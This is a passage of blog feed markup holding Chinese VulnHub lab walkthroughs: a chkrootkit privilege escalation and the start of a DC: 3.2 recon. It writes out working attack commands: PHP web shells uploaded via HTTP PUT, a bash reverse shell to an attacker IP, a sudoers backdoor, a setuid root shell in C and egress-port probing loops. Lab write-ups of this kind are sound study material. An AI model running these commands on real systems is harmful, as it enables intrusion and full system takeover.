class="hljs-meta">$</span><span class="bash"> nmap -p 80 192.168.202.13 --script http-put --script-args http-put.url=<span class="hljs-string">&#x27;/test/shell.php&#x27;</span>,http-put.file=<span class="hljs-string">&#x27;/home/kali/shell.php&#x27;</span></span><br></code></pre></td></tr></table></figure><p><strong>M3：通过 curl 命令使用 PUT 方法上传</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> curl -X PUT -d <span class="hljs-string">&#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span> http://192.168.135.154/<span class="hljs-built_in">test</span>/shell1.php</span><br><span class="hljs-meta">$</span><span class="bash"> curl -i -X PUT -H <span class="hljs-string">&quot;Content-Type: text/plain; charset=utf-8&quot;</span> -d <span class="hljs-string">&#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span> http://192.168.135.154/<span class="hljs-built_in">test</span>/shell2.php</span><br><span class="hljs-meta">$</span><span class="bash"> curl -v --upload-file shell.php --url http://192.168.202.13/<span class="hljs-built_in">test</span>/shell1.php -0 --http1.0</span><br><span class="hljs-meta">$</span><span class="bash"> curl -v -H <span class="hljs-string">&#x27;Expect:&#x27;</span> -T shell.php http://192.168.202.13/<span class="hljs-built_in">test</span>/</span><br></code></pre></td></tr></table></figure><h3 id="2、提权"><a href="#2、提权" class="headerlink" title="2、提权"></a>2、提权</h3><p><strong>M1：bash 反弹</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;#!/bin/bash\nbash -i &gt;&amp; /dev/tcp/192.168.135.141/443 0&gt;&amp;1\n&#x27;</span> &gt; /tmp/update</span><br></code></pre></td></tr></table></figure><p>然后监听 8080 端口就可以得到 root 权限的 shell 。</p><p><strong>M2：追加当前用户至 sudoer </strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;chmod +w /etc/sudoers &amp;&amp; echo &quot;www-data ALL=(ALL) NOPASSWD: ALL&quot; &gt;&gt; /etc/sudoers&#x27;</span> &gt; /tmp/update</span><br></code></pre></td></tr></table></figure><p><strong>M3：C</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>system(<span class="hljs-string">&quot;chown root:root /tmp/update&quot;</span>);<br>system(<span class="hljs-string">&quot;chmod 4755 /tmp/update&quot;</span>);<br>setuid(<span class="hljs-number">0</span>);<br>setgid(<span class="hljs-number">0</span>);<br>execl(<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;sh&quot;</span>,<span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3、chkrootkit"><a href="#3、chkrootkit" class="headerlink" title="3、chkrootkit"></a>3、chkrootkit</h3><blockquote><p>原文链接：<a href="https://blog.csdn.net/elephantxiang/article/details/122463492">https://blog.csdn.net/elephantxiang/article/details/122463492</a></p></blockquote><p>突然有个疑惑，chkrootkit 不是每天执行一次吗？为什么创建 update 没多久就可以实现提权了 ？最终在一篇文章中找到答案。</p><p>看了一下 <code>/etc/cron.daily/chkrootkit</code> 的内容，配合 <code>/etc/chkrootkit.conf</code> 文件，发现 <code>/etc/cron.daily/chkrootkit</code> 实际上根本不会被执行 。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cat /etc/cron.daily/chkrootkit</span><br><span class="hljs-meta">#</span><span class="bash">!/bin/sh</span><br><br>set -e<br><br>CHKROOTKIT=/usr/sbin/chkrootkit<br>CF=/etc/chkrootkit.conf<br>LOG_DIR=/var/log/chkrootkit<br><br>if [ &quot;$RUN_DAILY&quot; = &quot;true&quot; ]; then<br>    if [ &quot;$DIFF_MODE&quot; = &quot;true&quot; ]; then<br>                                eval $CHKROOTKIT $RUN_DAILY_OPTS &gt; $LOG_DIR/log.today.raw 2&gt;&amp;1<br><br>[......]<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> cat /etc/chkrootkit.conf</span><br>RUN_DAILY=&quot;false&quot;<br>RUN_DAILY_OPTS=&quot;-q&quot;<br>DIFF_MODE=&quot;false&quot;<br></code></pre></td></tr></table></figure><p>突然想起来，提权之前 <code>/etc/cron.d</code> 是没有权限查看的，在 root 权限下查看：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ls -l /etc/cron.d</span><br>total 8<br>-rwx------ 1 root root  36 Apr 12  2016 chkrootkit<br>-rwx------ 1 root root 544 Oct 27  2015 php5<br><span class="hljs-meta">$</span><span class="bash">cat /etc/cron.d/chkrootkit</span><br>* * * * * root /usr/sbin/chkrootkit<br></code></pre></td></tr></table></figure><p>发现 <code>/etc/cron.d</code> 下面还有个 chkrootkit ，果然是这货在每分钟执行一次 chkrootkit 。</p><h3 id="4、出站端口受限"><a href="#4、出站端口受限" class="headerlink" title="4、出站端口受限"></a>4、出站端口受限</h3><blockquote><p><a href="https://blog.51cto.com/u_15127601/2756621">照弹不误：出站端口受限环境下反弹Shell的思考</a></p></blockquote><p>虽然试了几个端口后找到了可以允许出站的端口，但如果不是 8080 这种常用的特殊端口，而是例如 15682 这种端口，通过几次尝试肯定找不到，还是要想个方法来找到一个可用的端口。</p><h4 id="批量端口探测"><a href="#批量端口探测" class="headerlink" title="批量端口探测"></a>批量端口探测</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> &#123;80,81&#125;; <span class="hljs-keyword">do</span> timeout 1 bash -c <span class="hljs-string">&quot;echo &gt;  /dev/tcp/192.168.135.141/<span class="hljs-variable">$i</span>&quot;</span> &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$i</span> open&quot;</span> || <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$i</span> close&quot;</span>;<span class="hljs-keyword">done</span></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> &#123;80..83&#125;; <span class="hljs-keyword">do</span> timeout 1 bash -c <span class="hljs-string">&quot;echo &gt;  /dev/tcp/192.168.135.141/<span class="hljs-variable">$i</span>&quot;</span> &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$i</span> open&quot;</span> || <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$i</span> close&quot;</span>;<span class="hljs-keyword">done</span></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-keyword">for</span> ((i=80;<span class="hljs-variable">$i</span>&lt;83;i++)); <span class="hljs-keyword">do</span> timeout 1 bash -c <span class="hljs-string">&quot;echo &gt;  /dev/tcp/192.168.135.141/<span class="hljs-variable">$i</span>&quot;</span> &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$i</span> open&quot;</span> || <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$i</span> close&quot;</span>;<span class="hljs-keyword">done</span></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(seq 80 83); <span class="hljs-keyword">do</span> timeout 1 bash -c <span class="hljs-string">&quot;echo &gt;  /dev/tcp/192.168.135.141/<span class="hljs-variable">$i</span>&quot;</span> &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$i</span> open&quot;</span> || <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$i</span> close&quot;</span>;<span class="hljs-keyword">done</span></span><br></code></pre></td></tr></table></figure><h4 id="批量捆绑监听端口"><a href="#批量捆绑监听端口" class="headerlink" title="批量捆绑监听端口"></a>批量捆绑监听端口</h4><blockquote><p>如果能够把多个端口流量转发至单个汇聚端口，就只需监听单个汇聚端口，目标上发起多个端口探测，只要在转发的多个端口的范围内，那么，一旦找到有效出站端口，汇聚端口一定有访问记录。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 重启之后设置失效，不用自己进行备份和恢复, 设置就会恢复</span> <br><span class="hljs-meta">#</span><span class="bash"> sudo iptables-save &gt; /tmp/firwall.rules</span><br><span class="hljs-meta">#</span><span class="bash"> sudo iptables-restore &lt; /tmp/firwall.rules</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br><span class="hljs-meta">$</span><span class="bash"> sudo iptables -A PREROUTING -t nat -p tcp --dport 1:65535 -j REDIRECT --to-port 4444</span><br></code></pre></td></tr></table></figure><h4 id="进行测试"><a href="#进行测试" class="headerlink" title="进行测试"></a>进行测试</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lvp 80</span>                                                                              <br>listening on [any] 80 ...<br>^C<br><br>wzz@ubuntu:~$ for i in &#123;80,81&#125;; do timeout 1 bash -c &quot;echo &gt;  /dev/tcp/192.168.135.141/$i&quot; &amp;&amp; echo &quot;$i open&quot; || echo &quot;$i close&quot;;done<br>bash: connect: Connection refused<br>bash: /dev/tcp/192.168.135.141/80: Connection refused<br>80 close<br>bash: connect: Connection refused<br>bash: /dev/tcp/192.168.135.141/81: Connection refused<br>81 close<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> nc -lvp 4444</span><br>listening on [any] 4444 ...<br>connect to [192.168.135.141] from 192.168.135.135 [192.168.135.135] 50430<br><br>wzz@ubuntu:~$ for i in &#123;80,81&#125;; do timeout 1 bash -c &quot;echo &gt;  /dev/tcp/192.168.135.141/$i&quot; &amp;&amp; echo &quot;$i open&quot; || echo &quot;$i close&quot;;done<br>80 open<br>bash: connect: Connection refused<br>bash: /dev/tcp/192.168.135.141/81: Connection refused<br>81 close<br></code></pre></td></tr></table></figure><p>成功实现，接下来就是直接上靶机进行探测</p><h4 id="靶机探测"><a href="#靶机探测" class="headerlink" title="靶机探测"></a>靶机探测</h4><p>为方便操作，上传木马，用 weevely 进行连接：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> curl -v -H <span class="hljs-string">&#x27;Expect:&#x27;</span> -T hello.php http://192.168.135.154/<span class="hljs-built_in">test</span>/</span><br>*   Trying 192.168.135.154:80...<br>* Connected to 192.168.135.154 (192.168.135.154) port 80 (#0)<br><span class="hljs-meta">&gt;</span><span class="bash"> PUT /<span class="hljs-built_in">test</span>/hello.php HTTP/1.1</span><br><span class="hljs-meta">&gt;</span><span class="bash"> Host: 192.168.135.154</span><br><span class="hljs-meta">&gt;</span><span class="bash"> User-Agent: curl/7.83.0</span><br><span class="hljs-meta">&gt;</span><span class="bash"> Accept: */*</span><br><span class="hljs-meta">&gt;</span><span class="bash"> Content-Length: 744</span><br><span class="hljs-meta">&gt;</span><span class="bash"> </span><br>* We are completely uploaded and fine<br>* Mark bundle as not supporting multiuse<br>&lt; HTTP/1.1 201 Created<br>&lt; Content-Length: 0<br>&lt; Date: Mon, 04 Jul 2022 15:43:44 GMT<br>&lt; Server: lighttpd/1.4.28<br>&lt; <br>* Connection #0 to host 192.168.135.154 left intact<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> weevely http://192.168.135.154/<span class="hljs-built_in">test</span>/hello.php <span class="hljs-built_in">test</span></span><br><br>[+] weevely 4.0.1<br><br>[+] Target:     www-data@ubuntu:/var/www/test<br>[+] Session:    /home/kali/.weevely/sessions/192.168.135.154/hello_0.session<br>[+] Shell:      System shell<br><br>[+] Browse the filesystem or execute commands starts the connection<br>[+] to the target. Type :help for more information.<br><span class="hljs-meta"></span><br><span class="hljs-meta">weevely&gt;</span><span class="bash"> ls</span><br>hello.php<br>php-reverse-shell.php<br>wzz.php<br>wzz1.sh<br>wzz2.sh<br>wzz3.sh<br></code></pre></td></tr></table></figure><p>之前已经测试得到了 8080 端口是可以反弹的，现在进行测试：</p><p>kali 端：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lvp 4444</span><br>listening on [any] 4444 ...<br>connect to [192.168.135.141] from 192.168.135.135 [192.168.135.135] 50430<br></code></pre></td></tr></table></figure><p>靶机端：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@ubuntu:/var/www/test $ for i in $(seq 8079 8081); do timeout 1 bash -c &quot;echo &gt;  /dev/tcp/192.168.135.141/$i&quot; &amp;&amp; echo &quot;$i open&quot; || echo &quot;$i close&quot;;done<br>8079 close<br>8080 open<br>8081 close<br>www-data@ubuntu:/var/www/test $ for i in $(seq 8079 8081); do timeout 1 bash -c &quot;echo &gt;  /dev/tcp/192.168.135.141/$i&quot; &amp;&amp; echo &quot;$i open&quot; || echo &quot;$i close&quot;;done<br>8079 close<br>bash: connect: Connection refused<br>bash: /dev/tcp/192.168.135.141/8080: Connection refused<br>8080 close<br>8081 close<br></code></pre></td></tr></table></figure><p>在测试中发现，可能由于防火墙的原因，如果 kali 不进行监听，在探测允许出站的目的端口时，那么会出现 <code>Connection refused</code> 的提示，而在探测不允许出站的目的端口时，却不会显示。</p><p>这样的话，就可以直接探测，kali 不用监听，出现错误的端口就是允许出站的目的端口 。</p><p>对探测语句进行修改：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(seq 1 65535); <span class="hljs-keyword">do</span> timeout 0.01 bash -c <span class="hljs-string">&quot;echo &gt;  /dev/tcp/192.168.135.141/<span class="hljs-variable">$i</span>&quot;</span>;<span class="hljs-keyword">done</span></span><br></code></pre></td></tr></table></figure><p>靶机执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@ubuntu:/var/www/test $ for i in $(seq 1 65535); do timeout 0.01 bash -c &quot;echo &gt;  /dev/tcp/192.168.135.141/$i&quot;;done<br>bash: connect: Connection refused<br>bash: /dev/tcp/192.168.135.141/443: Connection refused<br>bash: connect: Connection refused<br>bash: /dev/tcp/192.168.135.141/8080: Connection refused<br></code></pre></td></tr></table></figure><p>成功得到两个可以出站的端口 。</p><p>查看防火墙文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ls /root</span><br>304d840d52840689e0ab0af56d6d3a18-chkrootkit-0.49.tar.gz<br>7d03aaa2bf93d80040f3f22ec6ad9d5a.txt<br>chkrootkit-0.49<br>newRule<br><span class="hljs-meta">$</span><span class="bash"> cat /root/newRule</span><br><span class="hljs-meta">#</span><span class="bash"> Generated by iptables-save v1.4.12 on Mon Apr 25 22:48:24 2016</span><br>*filter<br>:INPUT DROP [0:0]<br>:FORWARD ACCEPT [0:0]<br>:OUTPUT DROP [0:0]<br>-A INPUT -p tcp -m tcp --dport 22 -j ACCEPT<br>-A INPUT -p tcp -m tcp --dport 80 -j ACCEPT<br>-A INPUT -p tcp -m tcp --sport 8080 -j ACCEPT<br>-A INPUT -p tcp -m tcp --sport 443 -j ACCEPT<br>-A OUTPUT -p tcp -m tcp --sport 22 -j ACCEPT<br>-A OUTPUT -p tcp -m tcp --sport 80 -j ACCEPT<br>-A OUTPUT -p tcp -m tcp --dport 8080 -j ACCEPT<br>-A OUTPUT -p tcp -m tcp --dport 443 -j ACCEPT<br>COMMIT<br><span class="hljs-meta">#</span><span class="bash"> Completed on Mon Apr 25 22:48:24 2016</span><br></code></pre></td></tr></table></figure><p>没毛病，允许出站的目的端口全部找到，但也的确太耗时间了，这里是为了测试这种方法的正确性进行了全部测试，真正使用时只需找到一个可以出站的端口就可以了，不用进行全部端口的探测，可以依照 “重要程度” 分批次对端口进行探测，”重要程度” 可以参照 nmap 的规则。</p><h4 id="猜测的端口范围"><a href="#猜测的端口范围" class="headerlink" title="猜测的端口范围"></a>猜测的端口范围</h4><p>目标既然允许访问外部的几个端口，一定是那些端口提供目标所需服务，那么，我没必要一开始就到 [1, 65535] 中去找有效端口，而是根据服务的常见程度，将所有端口划为几个层次，依次逐层猜解。</p><p>第一层，最常见端口。经验来看，DNS 的 53、HTTP 服务的默认端口 80、HTTPS 的 443 是三个最常见的出站端口。</p><p>第二层，较常见端口。大概包括如下几类：</p><ul><li><p>web 服务， HTTP 的 80、HTTPS 的 443；</p></li><li><p>中间件服务，weblogic 的 7001/7002、webshpere 的 9080/9090、jboss 的 8080；</p></li><li>远程管理服务，SSH 的 22、telnet 的 23、SNMP 的 161、RDP 的 3389；</li><li>数据传输服务，FTP 的 21、SCP/SFTP 的 22、SMB 的 137/138/139/445；</li><li>数据库服务，mssql 的 1433、mysql 的 3306、oracle 的 1521、LDAP 的 389；</li><li>缓存服务，redis 的 6379、memcached 的 11211；</li><li>邮件服务，SMTP 的 25、POP3 的 110、IMAP 的 143；</li><li>其他服务，DNS 的 53、NTP 的 123、kerberos 的 88；</li></ul><p>第三层，top100 常见端口。nmap 默认扫描 top1000 常见端口，通过 —top-ports 选项可以指定扫描更多常见端口。也就是说，nmap 内部梳理了一份已知服务默认端口列表，并且还能按常见程度排序，简直巴适，要获取 top100 常见端口：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -n --top-ports 100 127.0.0.1 -oA foo &gt; /dev/null</span><br><span class="hljs-meta">$</span><span class="bash"> grep -i <span class="hljs-string">&quot;services\=&quot;</span> foo.xml | sed -r <span class="hljs-string">&#x27;s/.*services\=\&quot;(.*)(\&quot;\/&gt;)/\1/g&#x27;</span></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> nmap -n --top-ports 100 127.0.0.1 -oA foo &gt; /dev/null</span><br><span class="hljs-meta">$</span><span class="bash"> grep -i <span class="hljs-string">&quot;services\=&quot;</span> foo.xml | sed -r <span class="hljs-string">&#x27;s/.*services\=\&quot;(.*)(\&quot;\/&gt;)/\1/g&#x27;</span></span><br>7,9,13,21-23,25-26,37,53,79-81,88,106,110-111,113,119,135,139,143-144,179,199,389,427,443-445,465,513-515,543-544,548,554,587,631,646,873,990,993,995,1025-1029,1110,1433,1720,1723,1755,1900,2000-2001,2049,2121,2717,3000,3128,3306,3389,3986,4899,5000,5009,5051,5060,5101,5190,5357,5432,5631,5666,5800,5900,6000-6001,6646,7070,8000,8008-8009,8080-8081,8443,8888,9100,9999-10000,32768,49152-49157<br></code></pre></td></tr></table></figure><p>采用相同思路，我可以持续探测 top200、top400 常见端口。</p>]]></content>
    
    
    <categories>
      
      <category>Penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Penetration</tag>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DC：3.2</title>
    <link href="/2022/07/03/Penetration/Vulnhub/Part-1/0x06%20DC-3/"/>
    <url>/2022/07/03/Penetration/Vulnhub/Part-1/0x06%20DC-3/</url>
    
    <content type="html"><![CDATA[<h1 id="0x06-DC-3-2-vulnhub"><a href="#0x06-DC-3-2-vulnhub" class="headerlink" title="0x06 DC: 3.2~vulnhub"></a>0x06 DC: 3.2~vulnhub</h1><blockquote><p>靶机地址：<a href="https://www.vulnhub.com/entry/dc-32,312/">DC: 3.2 ~ VulnHub</a></p><p>环境信息：</p><ul><li>攻击机 IP：192.168.135.141</li><li>靶机 IP：192.168.135.153</li></ul></blockquote><h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h3><p><strong>nmap 命令：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sn 192.168.135.0/24    <span class="hljs-comment"># 扫描该网段上活跃的主机</span></span><br></code></pre></td></tr></table></figure><p><strong>得到靶机 ip：192.168.135.153</strong></p><h3 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h3><p><strong>nmap 命令：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo nmap -sS -A -p- 192.168.135.153</span><br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-07-03 08:42 EDT<br>Nmap scan report for 192.168.135.153 (192.168.135.153)<br>Host is up (0.00053s latency).<br>Not shown: 65534 closed ports<br>PORT   STATE SERVICE VERSION<br>80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))<br>|_http-generator: Joomla! - Open Source Content Management<br>|_http-server-header: Apache/2.4.18 (Ubuntu)<br>|_http-title: Home<br>MAC Address: 00:0C:29:DD:1F:45 (VMware)<br>Device type: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br><br>TRACEROUTE<br>HOP RTT     ADDRESS<br>1   0.53 ms 192.168.135.153 (192.168.135.153)<br><br>Nmap done: 1 IP address (1 host up) scanned in 12.92 seconds<br></code></pre></td></tr></table></figure><p><strong>得到目标端口信息：</strong></p><div class="table-container"><table><thead><tr><th>PORT</th><th>STATE</th><th>SERVICE</th><th>其他</th></tr></thead><tbody><tr><td>80/tcp</td><td>open</td><td>http</td><td>Joomla! - Open Source Content Management</td></tr></tbody></table></div><h3 id="3、端口探测"><a href="#3、端口探测" class="headerlink" title="3、端口探测"></a>3、端口探测</h3><p><strong>80端口</strong></p><p>访问：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs applescript">Welcome <span class="hljs-keyword">to</span> DC<span class="hljs-number">-3.</span><br>This <span class="hljs-built_in">time</span>, there <span class="hljs-keyword">is</span> only one flag, one entry point <span class="hljs-keyword">and</span> no clues.<br>To <span class="hljs-keyword">get</span> <span class="hljs-keyword">the</span> flag, you&#x27;ll obviously have <span class="hljs-keyword">to</span> gain root privileges.<br>How you <span class="hljs-keyword">get</span> <span class="hljs-keyword">to</span> be root <span class="hljs-keyword">is</span> up <span class="hljs-keyword">to</span> you - <span class="hljs-keyword">and</span>, obviously, <span class="hljs-keyword">the</span> system.<br>Good luck - <span class="hljs-keyword">and</span> I hope you enjoy this little challenge.  :-)<br></code></pre></td></tr></table></figure><p>进行目录爆破：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> dirb http://192.168.135.153</span><br><br>---- Scanning URL: http://192.168.135.153/ ----<br>==&gt; DIRECTORY: http://192.168.135.153/administrator/<br>==&gt; DIRECTORY: http://192.168.135.153/bin/<br>==&gt; DIRECTORY: http://192.168.135.153/cache/<br>==&gt; DIRECTORY: http://192.168.135.153/components/<br>==&gt; DIRECTORY: http://192.168.135.153/images/<br>==&gt; DIRECTORY: http://192.168.135.153/includes/<br>+ http://192.168.135.153/index.php (CODE:200|SIZE:7110)<br>==&gt; DIRECTORY: http://192.168.135.153/language/<br>==&gt; DIRECTORY: http://192.168.135.153/layouts/<br>==&gt; DIRECTORY: http://192.168.135.153/libraries/<br>==&gt; DIRECTORY: http://192.168.135.153/media/<br>==&gt; DIRECTORY: http://192.168.135.153/modules/<br>==&gt; DIRECTORY: http://192.168.135.153/plugins/<br>+ http://192.168.135.153/server-status (CODE:403|SIZE:303)<br>==&gt; DIRECTORY: http://192.168.135.153/templates/<br>==&gt; DIRECTORY: http://192.168.135.153/tmp/<br></code></pre></td></tr></table></figure><p>joomscan 扫描：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 